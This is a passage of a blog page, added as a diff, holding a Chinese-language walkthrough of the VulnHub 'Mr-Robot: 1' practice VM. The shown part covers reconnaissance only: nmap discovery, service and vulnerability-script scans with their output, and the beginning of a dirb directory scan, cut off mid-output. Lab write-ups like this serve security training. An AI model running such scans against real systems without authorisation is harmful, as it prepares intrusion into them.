@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="发布日期姓名：Mr-Robot: 1发布日期：2016年6月28日 下载 Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;mrrobot&#x2F;mrRobot.ova Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;mrrobot&#x2F;mrRobot.ova.torrent">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[Mr-Robot-1]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/01/02/Mr-Robot-1/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="发布日期姓名：Mr-Robot: 1发布日期：2016年6月28日 下载 Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;mrrobot&#x2F;mrRobot.ova Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;mrrobot&#x2F;mrRobot.ova.torrent">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub126.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub127.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub128.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-01-02T08:35:47.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:56:28.669Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub126.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/01/02/Mr-Robot-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/01/02/Mr-Robot-1/","path":"2020/01/02/Mr-Robot-1/","title":"vulnhub靶机渗透[Mr-Robot-1]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[Mr-Robot-1] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E5%B8%83%E6%97%A5%E6%9C%9F"><span class="nav-number">1.</span> <span class="nav-text">发布日期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">6.</span> <span class="nav-text">提权</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/01/02/Mr-Robot-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[Mr-Robot-1] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[Mr-Robot-1]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-01-02 16:35:47" itemprop="dateCreated datePublished" datetime="2020-01-02T16:35:47+08:00">2020-01-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:56:28" itemprop="dateModified" datetime="2020-08-17T00:56:28+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>姓名：Mr-Robot: 1<br>发布日期：2016年6月28日</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9tcnJvYm90L21yUm9ib3Qub3Zh">https://download.vulnhub.com/mrrobot/mrRobot.ova<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9tcnJvYm90L21yUm9ib3Qub3ZhLnRvcnJlbnQ=">https://download.vulnhub.com/mrrobot/mrRobot.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<span id="more"></span>
+
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>根据表演，机器人先生。<br>此VM在不同位置有三个key。 您的目标是找到全部三个。 每个密钥逐渐难以找到。<br>VM不太困难。 没有任何高级开发或逆向工程。 该级别被认为是初学者-中级。</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.107</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:8D:B7:92 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -v -sV -Pn 192.168.56.107</span></span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd</span><br><span class="line">443/tcp open   ssl/http Apache httpd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 80,443,22 -sV -Pn -T5 -A --script=vuln 192.168.56.107</span></span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.107</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni(<span class="string">&quot;Email</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: http://192.168.56.107/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.107:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni(&quot;</span>Email</span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/wp-login.php</span><br><span class="line">|     Form <span class="built_in">id</span>: loginform</span><br><span class="line">|_    Form action: http://192.168.56.107/wp-login.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /admin/: Possible admin folder</span></span><br><span class="line"><span class="string">|   /admin/index.html: Possible admin folder</span></span><br><span class="line"><span class="string">|   /wp-login.php: Possible admin folder</span></span><br><span class="line"><span class="string">|   /robots.txt: Robots file</span></span><br><span class="line"><span class="string">|   /feed/: Wordpress version: 4.3.1</span></span><br><span class="line"><span class="string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span></span><br><span class="line"><span class="string">|   /wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /wp-admin/upgrade.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /readme.html: Interesting, a readme.</span></span><br><span class="line"><span class="string">|   /0/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /image/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-server-header: Apache</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">443/tcp open   ssl/http Apache httpd</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.107</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/rs;<span class="keyword">if</span>(s.useForcedLinkTracking||s.bcf)&#123;<span class="keyword">if</span>(!s.<span class="string">&quot;</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://192.168.56.107:443/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: https://192.168.56.107:443/js/rs;if(s.useForcedLinkTracking||s.bcf)&#123;if(!s.&quot;</span></span><br><span class="line">|     Form <span class="built_in">id</span>: </span><br><span class="line">|_    Form action: https://192.168.56.107:443/</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /admin/: Possible admin folder</span></span><br><span class="line"><span class="string">|   /admin/index.html: Possible admin folder</span></span><br><span class="line"><span class="string">|   /wp-login.php: Possible admin folder</span></span><br><span class="line"><span class="string">|   /robots.txt: Robots file</span></span><br><span class="line"><span class="string">|   /feed/: Wordpress version: 4.3.1</span></span><br><span class="line"><span class="string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span></span><br><span class="line"><span class="string">|   /wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /wp-admin/upgrade.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /readme.html: Interesting, a readme.</span></span><br><span class="line"><span class="string">|   /0/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /image/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-server-header: Apache</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_sslv2-drown:</span><br></pre></td></tr></table></figure>
+
+<p>dirb扫一波</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.107/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span 